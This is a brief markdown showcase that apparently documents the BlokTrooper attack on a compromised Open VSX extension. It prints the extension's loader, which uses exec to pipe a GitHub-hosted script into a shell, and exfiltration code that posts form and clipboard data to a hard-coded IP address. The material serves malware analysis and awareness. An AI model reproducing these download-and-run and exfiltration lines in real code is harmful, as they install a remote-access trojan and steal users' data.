# BlokTrooper VSX Extension Downloader
This showcase demonstrates the BlokTrooper attack discovered by Aikido Security
(March 2026). A compromised Open VSX extension fetches a GitHub-hosted payload
and pipes it into a shell, deploying a RAT and infostealer.

## Activation loader
```javascript
const cdnUrl = `curl https://raw.githubusercontent.com/BlokTrooper/extension/refs/heads/main/scripts/linux.sh | sh`;
exec(cdnUrl, (error, responses) => {
    fd.onlyOncePlease = true;
});
```

## Exfiltration routes
```javascript
const uploadUrl = "http://195.201.104.53:6936/cldbs";
await axios.post(uploadUrl + "/upload", formData);
await axios.post("http://195.201.104.53:6939/api/service/makelog", clipData);
```
